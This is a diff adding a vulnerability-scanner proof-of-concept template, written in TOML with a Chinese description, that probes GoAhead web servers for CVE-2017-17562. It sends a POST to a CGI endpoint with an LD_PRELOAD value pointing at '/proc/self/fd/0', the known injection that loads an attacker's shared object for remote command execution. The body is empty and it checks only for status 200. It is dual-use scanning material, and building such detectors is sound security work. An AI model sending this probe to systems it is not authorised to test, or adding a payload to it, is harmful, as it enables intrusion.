@@ -1,0 +1,33 @@
+[info]
+author = "ave"
+description = "通过向 GoAhead CGI 端点发送包含 LD_PRELOAD 环境变量注入的 POST 请求，验证目标是否存在远程命令执行漏洞。攻击者利用 CGI 处理时将 HTTP 参数直接设置为环境变量的缺陷，通过 LD_PRELOAD 加载恶意共享对象实现 RCE。"
+id = "POC-AVE-2017-0600"
+name = "GoAhead CGI LD_PRELOAD 环境变量注入 PoC"
+severity = "high"
+tags = ["ave-2017-0600"]
+vuln_id = [
+    "CVE-2017-17562",
+    "AVE-2017-0600",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/test"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/octet-stream"
+LD_PRELOAD = "/proc/self/fd/0"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
